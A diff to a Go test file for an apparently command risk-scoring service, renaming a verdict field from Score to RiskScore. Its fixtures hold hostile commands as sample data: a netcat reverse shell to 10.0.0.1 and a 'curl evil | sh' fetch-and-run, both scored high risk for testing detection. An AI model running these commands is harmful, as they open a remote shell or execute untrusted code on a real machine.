@@ -81,7 +81,7 @@ func TestLivePushToConnectedClient(t *testing.T) {
 	// Give the server a moment to register the client before publishing.
 	waitForClients(t, s, 1)
 
-	s.Publish(types.Verdict{Command: "nc -e /bin/sh 10.0.0.1 9001", Band: types.BandHigh, Score: 0.95})
+	s.Publish(types.Verdict{Command: "nc -e /bin/sh 10.0.0.1 9001", Band: types.BandHigh, RiskScore: 0.95})
 	v := readVerdict(t, c)
 	if v.Command != "nc -e /bin/sh 10.0.0.1 9001" || v.Band != types.BandHigh {
 		t.Fatalf("live push wrong: %+v", v)
@@ -101,7 +101,7 @@ func TestPublishPersistsAndAPIServes(t *testing.T) {
 
 	base := time.Date(2026, 6, 22, 10, 0, 0, 0, time.UTC)
 	s.Publish(types.Verdict{Command: "ls -la", Band: types.BandLow, Ts: base})
-	s.Publish(types.Verdict{Command: "curl evil | sh", Band: types.BandHigh, Score: 0.9, Ts: base.Add(time.Second)})
+	s.Publish(types.Verdict{Command: "curl evil | sh", Band: types.BandHigh, RiskScore: 0.9, Ts: base.Add(time.Second)})
 
 	// GET /api/verdicts → newest first, persisted.
 	resp, err := http.Get(ts.URL + "/api/verdicts?limit=20")
